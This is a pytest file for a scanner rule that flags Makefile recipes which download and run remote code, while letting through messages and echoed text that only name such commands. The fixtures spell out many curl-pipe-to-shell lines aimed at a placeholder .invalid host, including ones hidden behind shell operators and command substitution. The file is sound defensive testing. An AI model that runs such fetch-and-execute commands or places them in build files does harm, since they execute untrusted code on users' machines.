"""`SUSPECT.BUILD.MAKE_FETCH_EXEC.001`: a recipe that downloads and runs, not a message that says to
(review 98 G6)."""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

RULE = "SUSPECT.BUILD.MAKE_FETCH_EXEC.001"


class MakeHelpers:
    @staticmethod
    def flagged(tmp_path, text: str) -> bool:
        (tmp_path / "Makefile").write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)


class TestMakeFetchExec:
    @pytest.mark.parametrize(
        "text",
        [
            "lint:\n\tcurl -sfL https://x.invalid/install.sh | sh\n",
            "tools:\n\t@curl -sL https://x.invalid/tool -o bin/tool\n\t@chmod +x bin/tool\n",
            # A message elsewhere in the file does not excuse the recipe below it.
            "$(info building)\nlint:\n\tcurl -sfL https://x.invalid/install.sh | sh\n",
            "lint:\n\t@echo linting; curl https://x.invalid/a | bash\n",
        ],
    )
    def test_a_recipe_that_fetches_and_runs_is_reported(self, tmp_path, text: str) -> None:
        assert MakeHelpers.flagged(tmp_path, text)

    @pytest.mark.parametrize(
        "text",
        [
            # cobra's Makefile: what to run, told to a person; make runs none of it.
            'ifeq (, $(shell which golangci-lint))\n$(warning "could not find golangci-lint, run: '
            'curl -sfL https://x.invalid/install.sh | sh")\nendif\n',
            "$(error missing tool; install it with curl https://x.invalid/i.sh | sh)\n",
            "${info see: curl https://x.invalid/i.sh | sh}\n",
        ],
    )
    def test_a_message_that_names_the_command_is_not(self, tmp_path, text: str) -> None:
        assert not MakeHelpers.flagged(tmp_path, text)


class TestAPrintedCommandIsNotRun:
    """Release item 68, fix 4: an `echo`/`printf` argument is text (agentql-mcp's Makefile prints
    the install command; it never runs it). Only that argument is text: what follows a shell
    operator, a pipe into a shell, or a command substitution still runs."""

    @pytest.mark.parametrize(
        "text",
        [
            'help:\n\t@echo "  curl -sSfL https://x.invalid/install.sh | sh"\n',
            "help:\n\techo 'curl -sSfL https://x.invalid/install.sh | sh'\n",
            'help:\n\t@printf "%s\\n" "curl https://x.invalid/i.sh | bash"\n',
        ],
    )
    def test_the_printed_command_is_not_reported(self, tmp_path, text: str) -> None:
        assert not MakeHelpers.flagged(tmp_path, text)

    @pytest.mark.parametrize(
        "text",
        [
            "t:\n\techo x; curl https://x.invalid/i.sh | sh\n",
            "t:\n\techo x && curl https://x.invalid/i.sh | sh\n",
            "t:\n\techo x || curl https://x.invalid/i.sh | sh\n",
            # The text is piped into a shell, so it is run.
            't:\n\techo "curl https://x.invalid/i.sh | sh" | sh\n',
            # A command substitution inside double quotes runs.
            't:\n\techo "$(curl -sfL https://x.invalid/i.sh | sh)"\n',
            "t:\n\techo `curl -sfL https://x.invalid/i.sh | sh`\n",
        ],
    )
    def test_what_still_runs_is_reported(self, tmp_path, text: str) -> None:
        assert MakeHelpers.flagged(tmp_path, text)
